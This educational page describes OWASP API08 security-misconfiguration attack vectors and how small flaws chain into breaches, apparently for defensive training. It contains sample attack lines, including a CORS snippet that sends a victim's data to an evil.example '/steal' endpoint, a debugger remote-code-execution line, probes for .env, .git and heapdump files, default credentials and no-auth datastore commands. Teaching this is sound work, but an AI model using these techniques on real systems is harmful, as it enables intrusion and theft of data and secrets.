# API08: Security Misconfiguration - Attack Vectors

## Table of Contents
- [Understanding Misconfiguration Attack Vectors](#understanding-misconfiguration-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining Misconfigurations](#chaining-misconfigurations)

## Understanding Misconfiguration Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in systems you own or are authorised to test.

Misconfiguration is rarely exploited through a clever payload. It is exploited through **observation**: an attacker sends ordinary requests, reads what the API volunteers about itself, and walks through whichever door was left open. Because the flaws are in settings rather than logic, they are cheap to find at scale—automated scanners fingerprint thousands of hosts an hour.

The attacker's goal in this category is usually one of:
- Extract information that maps the internals (versions, paths, schemas, secrets).
- Reach a control surface that should never have been public (debug console, dashboard, admin route, database).
- Turn a permissive policy (CORS, HTTP methods, TLS) into data theft or tampering.

### Core Attack Flow

```
1. Fingerprint
   ↓
   Read banners, headers, error bodies, /swagger, robots.txt
2. Enumerate
   ↓
   Probe default paths, management endpoints, backup files, methods
3. Exploit
   ↓
   Use default creds, open console, permissive CORS, no-auth datastore
4. Escalate / Exfiltrate
   ↓
   Pull secrets, pivot internally, read or wipe data
```

## Common Attack Patterns

### 1. Verbose Error Messages / Stack-Trace Leakage

An unexpected input triggers an unhandled exception and the framework returns the full trace to the client.

```http
GET /api/orders?id=' HTTP/1.1

HTTP/1.1 500 Internal Server Error
{
  "traceback": "File \"/srv/app/orders.py\", line 88, in get_order\n    cur.execute(sql)",
  "sql": "SELECT * FROM orders WHERE id=''",
  "db": "postgres://app:S3cr3t@db.internal:5432/prod"
}
```

**Payoff**: source paths, ORM/engine, table names, internal hostnames, and sometimes live credentials—all without a real exploit.

### 2. Interactive Debugger Exposed in Production

Frameworks in debug mode ship an in-browser console. The Werkzeug (Flask) debugger is the canonical example.

```http
GET /trigger-error HTTP/1.1
→ 500 page with an interactive console pin prompt

# If the console is reachable, arbitrary Python runs on the server:
>>> __import__('os').popen('id').read()
```

**Payoff**: direct remote code execution. Debug mode must be off, and the debugger must be unreachable, in production.

### 3. Default and Sample Credentials

Attackers try well-known credential pairs against admin panels, databases, and management APIs.

```http
POST /admin/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"admin"}
→ 200 OK  { "token": "..." }
```

Common pairs: `admin/admin`, `root/root`, `elastic/changeme`, `guest/guest`, plus vendor-specific defaults. Sample apps and seeded test accounts count too.

### 4. Overly Permissive CORS

The server reflects the request `Origin` and allows credentials, so a malicious page can read authenticated responses.

```http
GET /api/me HTTP/1.1
Origin: https://evil.example

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
{ "email": "victim@corp.com", "role": "admin" }
```

```javascript
// Runs on evil.example while the victim is logged in:
fetch('https://api.victim.com/api/me', { credentials: 'include' })
  .then(r => r.json()).then(d => navigator.sendBeacon('/steal', JSON.stringify(d)));
```

**Payoff**: cross-origin theft of any data the victim can access. Watch for `Origin: null` and prefix/suffix matching bugs (`victim.com.evil.com`) too.

### 5. Missing Security Headers

Absent response headers enable a family of browser-side attacks.

```http
HTTP/1.1 200 OK
# No Strict-Transport-Security  -> downgrade / SSL-strip
# No X-Content-Type-Options     -> MIME sniffing of JSON as HTML/JS
# No X-Frame-Options / CSP frame-ancestors -> clickjacking
# No Content-Security-Policy    -> injected script executes freely
```

**Payoff**: clickjacking, MIME confusion, and easier XSS exploitation—each cheap once the header is simply missing.

### 6. Unnecessary HTTP Methods Enabled

Servers often accept verbs the application never needs.

```http
OPTIONS /api/users HTTP/1.1
→ Allow: GET, POST, PUT, DELETE, TRACE, PATCH

TRACE /api/users HTTP/1.1        # reflects request, aids XST / header disclosure
PUT /api/config/app.json         # unintended write if WebDAV/PUT is on
DELETE /api/users/1              # destructive verb exposed with no auth check
```

**Payoff**: unintended writes/deletes, request reflection, and a broader attack surface than the documented API.

### 7. Exposed Management / Actuator / Debug Endpoints

Operational endpoints are shipped enabled and unauthenticated.

```http
GET /actuator/env         # Spring Boot: full environment, may include secrets
GET /actuator/heapdump    # downloadable memory image (tokens, sessions)
GET /metrics              # Prometheus metrics, internal topology
GET /debug/pprof/         # Go profiling, source-level detail
```

**Payoff**: secrets, internal architecture, and sometimes memory dumps containing live tokens.

### 8. Directory Listing and Exposed Files

Auto-indexing or leftover files disclose source and secrets.

```http
GET /.git/config          # full source history if .git is served
GET /.env                 # environment secrets
GET /backup.sql           # database dump left in web root
GET /uploads/             # 200 with a browsable file index
```

**Payoff**: source code, credentials, and backups downloaded directly.

### 9. Version Banners and Fingerprinting

Servers advertise exact software and versions.

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
X-Powered-By: Express
X-AspNet-Version: 4.0.30319
```

**Payoff**: instant CVE matching. Automated tools map the banner to known exploits with no extra probing.

### 10. TLS / Transport Misconfiguration

Weak protocol versions, weak ciphers, or missing HSTS allow interception and downgrade.

```
- TLS 1.0 / 1.1 still enabled
- Export/RC4/3DES ciphers accepted
- No Strict-Transport-Security header
- Mixed HTTP/HTTPS endpoints for the same API
```

**Payoff**: man-in-the-middle, downgrade, and cookie/token interception.

### 11. Unpatched Systems and Outdated Components

Running a version with a public advisory is exploitation-by-catalogue.

```http
Server: Apache/2.4.49        # path traversal / RCE class advisories exist
X-Powered-By: PHP/5.6.40     # end-of-life, unpatched
```

**Payoff**: attackers run a known exploit for the exact version you advertise. This overlaps heavily with API09/A06 (vulnerable components).

### 12. Misconfigured Cloud Storage and Permissions

Object storage and IAM policies are too broad.

```
GET https://victim-backups.s3.amazonaws.com/   # public bucket lists objects
- Bucket ACL: "AllUsers" or "AuthenticatedUsers" read
- IAM role: wildcard "s3:*" on "*" attached to the API
```

**Payoff**: bulk download of backups/customer data, or write access to tamper with served content.

### 13. Unauthenticated Datastores and Management Ports

Databases and brokers bound to public interfaces with default no-auth settings.

```
mongodb://target:27017      # no auth, full read/write
http://target:9200/_cat/indices   # Elasticsearch open
redis-cli -h target -p 6379 CONFIG GET *   # no auth
http://target:8080           # Kubernetes / admin dashboard, no login
```

**Payoff**: complete data exposure, tampering, wiping, or a pivot into the cluster.

### 14. Missing Rate Limiting and Resource Controls

No throttling turns cheap endpoints into brute-force and denial-of-service surfaces.

```http
# Thousands of attempts, no lockout, no 429:
POST /api/login  {"user":"admin","password":"<guess-1>"}
POST /api/login  {"user":"admin","password":"<guess-2>"}
...
```

**Payoff**: credential stuffing, OTP/token brute force, and resource exhaustion. (Overlaps with API04 Unrestricted Resource Consumption, but the *absence of the limit* is a configuration failure.)

## Chaining Misconfigurations

Individually minor issues combine into full compromise:

```
Version banner (nginx/PHP)        -> pick a matching known exploit
        +
Directory listing exposes /.env   -> read DB credentials
        +
Datastore bound to 0.0.0.0        -> connect directly with those creds
        =  full data breach, no application bug required
```

Another common chain:

```
Verbose error leaks internal host -> /actuator/env leaks a token
        -> token used against an internal admin API
        -> permissive CORS exfiltrates the results to attacker page
```

## Key Takeaways

1. **Misconfiguration is exploited by observation, not payloads**—the API tells the attacker how to attack it.
2. **Verbose errors and banners are free reconnaissance**; silence them.
3. **Management planes are the crown jewels**—debug consoles, dashboards, actuator, and admin ports must never be openly reachable.
4. **Defaults and leftovers kill**—default creds, sample data, `.git`, `.env`, and backups in the web root are routinely harvested.
5. **Small issues chain**—a banner plus an exposed file plus an open datastore equals a breach with no code exploit at all.

## Next Steps

- **[Prevention Guide](prevention.md)**: Build a repeatable hardening baseline
- **[Code Examples](examples.md)**: See secure configuration across frameworks
- **[Hands-On Lab](lab/api08-misconfig-lab/)**: Practice finding and fixing misconfiguration
